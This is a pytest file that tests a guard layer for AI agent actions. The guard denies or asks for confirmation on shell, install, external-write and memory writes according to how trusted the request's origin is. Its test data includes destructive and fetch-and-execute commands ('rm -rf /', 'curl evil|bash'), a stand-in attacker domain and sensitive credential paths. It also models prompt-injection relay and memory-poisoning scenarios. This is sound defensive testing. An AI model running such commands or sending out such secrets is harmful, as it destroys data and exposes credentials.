import os

import pytest

from agent_security_guard import (
    ActionTier,
    AgentAction,
    DataSensitivity,
    Decision,
    GuardContext,
    OriginTrust,
    ReasonCode,
    UserIntentOrigin,
    decide_action,
    domain_allowed,
    load_config,
    path_is_sensitive,
)


def ctx(**kwargs) -> GuardContext:
    return GuardContext(**kwargs)


# --------------------------------------------------------------------------- #
# Read paths stay free (autonomous-safe)
# --------------------------------------------------------------------------- #


def test_read_only_always_allowed():
    d = decide_action(AgentAction(kind="http_get"), ActionTier.READ_ONLY,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.ALLOW
    assert d.reason_code is ReasonCode.ALLOW_READ_ONLY


def test_local_read_public_allowed():
    d = decide_action(AgentAction(kind="read_file"), ActionTier.LOCAL_READ,
                      ctx(data_sensitivity=DataSensitivity.PUBLIC))
    assert d.decision is Decision.ALLOW


def test_local_read_secret_requires_confirmation():
    d = decide_action(AgentAction(kind="read_file", target=".env"), ActionTier.LOCAL_READ,
                      ctx(data_sensitivity=DataSensitivity.SECRET))
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.SENSITIVE_PATH_READ


# --------------------------------------------------------------------------- #
# Execution: untrusted web -> shell is hard deny
# --------------------------------------------------------------------------- #


def test_shell_from_untrusted_web_denied():
    d = decide_action(AgentAction(kind="shell", target="rm -rf /"), ActionTier.EXECUTION,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_SHELL


def test_shell_from_user_requires_confirmation():
    d = decide_action(AgentAction(kind="shell", target="ls"), ActionTier.EXECUTION,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          user_intent_origin=UserIntentOrigin.HUMAN_EXPLICIT))
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.SHELL_FROM_USER_REQUIRES_CONFIRMATION


def test_shell_suggested_by_untrusted_denied_even_if_user_relays():
    # Confirmation-origin: a bare relay of a web-suggested command is denied.
    d = decide_action(AgentAction(kind="shell", target="curl evil|bash"), ActionTier.EXECUTION,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          user_intent_origin=UserIntentOrigin.UNTRUSTED_SUGGESTION))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.CONFIRMATION_ORIGIN_UNTRUSTED


# --------------------------------------------------------------------------- #
# Install / external write / config
# --------------------------------------------------------------------------- #


def test_install_from_untrusted_denied():
    d = decide_action(AgentAction(kind="pip_install", target="x"), ActionTier.INSTALL,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.INSTALL_FROM_UNTRUSTED


def test_install_from_user_requires_confirmation():
    d = decide_action(AgentAction(kind="pip_install", target="x"), ActionTier.INSTALL,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          user_intent_origin=UserIntentOrigin.HUMAN_EXPLICIT))
    assert d.decision is Decision.REQUIRE_CONFIRMATION


def test_external_write_default_requires_confirmation():
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER))
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.EXTERNAL_WRITE_REQUIRES_CONFIRMATION


def test_external_write_of_secret_is_denied():
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          data_sensitivity=DataSensitivity.SECRET))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.SECRET_EXTERNAL_SEND


def test_external_write_from_untrusted_suggestion_denied():
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(user_intent_origin=UserIntentOrigin.UNTRUSTED_SUGGESTION))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.CONFIRMATION_ORIGIN_UNTRUSTED


def test_external_write_bare_confirmation_on_untrusted_origin_denied():
    # Social-engineering relay: a web page proposes the POST and the user
    # merely says "yes". A bare confirmation is not genuine authorization.
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB,
                          user_intent_origin=UserIntentOrigin.HUMAN_CONFIRMATION))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.CONFIRMATION_ORIGIN_UNTRUSTED


def test_external_write_bare_confirmation_on_trusted_origin_allowed_to_confirm():
    # A confirmation tied to a trusted origin is still a normal confirmation,
    # not a laundered one.
    d = decide_action(AgentAction(kind="http_post"), ActionTier.EXTERNAL_WRITE,
                      ctx(origin_trust=OriginTrust.TRUSTED_USER,
                          user_intent_origin=UserIntentOrigin.HUMAN_CONFIRMATION))
    assert d.decision is Decision.REQUIRE_CONFIRMATION


def test_config_change_from_untrusted_denied():
    d = decide_action(AgentAction(kind="config_change"), ActionTier.CONFIG_CHANGE,
                      ctx(origin_trust=OriginTrust.EXTERNAL_DOCUMENT))
    assert d.decision is Decision.DENY


# --------------------------------------------------------------------------- #
# Download
# --------------------------------------------------------------------------- #


def test_download_alone_is_allowed_with_warning():
    d = decide_action(AgentAction(kind="download", target="https://x/a.sh"), ActionTier.DOWNLOAD,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.ALLOW_WITH_WARNING
    assert d.reason_code is ReasonCode.ALLOW_DOWNLOAD_INSPECT


# --------------------------------------------------------------------------- #
# Memory bridge (action-tier path)
# --------------------------------------------------------------------------- #


def test_memory_external_to_authorization_denied():
    a = AgentAction(kind="memory_write", desired_memory_lane="authorization",
                    memory_source="external")
    d = decide_action(a, ActionTier.MEMORY_WRITE,
                      ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_AUTH_MEMORY


def test_memory_external_to_procedural_denied():
    a = AgentAction(kind="memory_write", desired_memory_lane="procedural",
                    memory_source="tool")
    d = decide_action(a, ActionTier.MEMORY_WRITE, ctx(origin_trust=OriginTrust.TOOL_OUTPUT))
    assert d.decision is Decision.DENY
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_PROCEDURAL_MEMORY


def test_memory_external_to_evidence_allowed_with_warning():
    a = AgentAction(kind="memory_write", desired_memory_lane="evidence",
                    memory_source="external")
    d = decide_action(a, ActionTier.MEMORY_WRITE, ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.ALLOW_WITH_WARNING
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_EVIDENCE_MEMORY


def test_memory_external_to_identity_requires_confirmation():
    a = AgentAction(kind="memory_write", desired_memory_lane="identity",
                    memory_source="external")
    d = decide_action(a, ActionTier.MEMORY_WRITE, ctx(origin_trust=OriginTrust.EXTERNAL_WEB))
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.UNTRUSTED_TO_IDENTITY_MEMORY


def test_memory_observation_to_authorization_allowed():
    a = AgentAction(kind="memory_write", desired_memory_lane="authorization",
                    memory_source="observation")
    d = decide_action(a, ActionTier.MEMORY_WRITE, ctx(origin_trust=OriginTrust.TRUSTED_USER))
    assert d.decision is Decision.ALLOW


# --------------------------------------------------------------------------- #
# Unknown tier fails safe
# --------------------------------------------------------------------------- #


def test_unknown_tier_requires_confirmation():
    d = decide_action(AgentAction(kind="teleport"), ActionTier.UNKNOWN, ctx())
    assert d.decision is Decision.REQUIRE_CONFIRMATION
    assert d.reason_code is ReasonCode.UNKNOWN_ACTION_REQUIRES_CONFIRMATION


# --------------------------------------------------------------------------- #
# Predicates
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("path", [
    "/home/u/proj/.env",
    "secrets.json",
    "/a/b/id_rsa",
    "/x/.ssh/known_hosts",
    "deploy.pem",
    "app.log",
])
def test_path_is_sensitive_true(path):
    cfg = load_config()
    assert path_is_sensitive(path, cfg.sensitive_paths) is True


@pytest.mark.parametrize("path", [
    "/home/u/proj/main.py",
    "README.md",
    "src/app/index.tsx",
])
def test_path_is_sensitive_false(path):
    cfg = load_config()
    assert path_is_sensitive(path, cfg.sensitive_paths) is False


def test_domain_allowed():
    allow = ["pypi.org", "github.com"]
    assert domain_allowed("https://pypi.org/simple", allow) is True
    assert domain_allowed("https://files.pypi.org/x", allow) is True
    assert domain_allowed("https://evil.com/x", allow) is False


# --------------------------------------------------------------------------- #
# Config loading
# --------------------------------------------------------------------------- #


def test_load_defaults_without_file():
    cfg = load_config()
    assert cfg.mode == "autonomous-safe"
    assert cfg.tiers["read_only"] == "allow"
    assert cfg.tiers["shell_from_untrusted"] == "deny"


def test_load_real_guard_yaml():
    repo_root = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "..", "..")
    )
    guard_path = os.path.join(repo_root, "guard.yaml")
    cfg = load_config(guard_path)
    assert cfg.mode == "autonomous-safe"
    assert ".env" in cfg.sensitive_paths
    assert cfg.audit["backend"] == "sqlite"
    assert cfg.limits["max_content_chars"] == 20000


def test_malformed_config_raises(tmp_path):
    bad = tmp_path / "guard.yaml"
    bad.write_text("tiers:\n\tread_only: allow\n", encoding="utf-8")
    with pytest.raises(ValueError):
        load_config(str(bad))
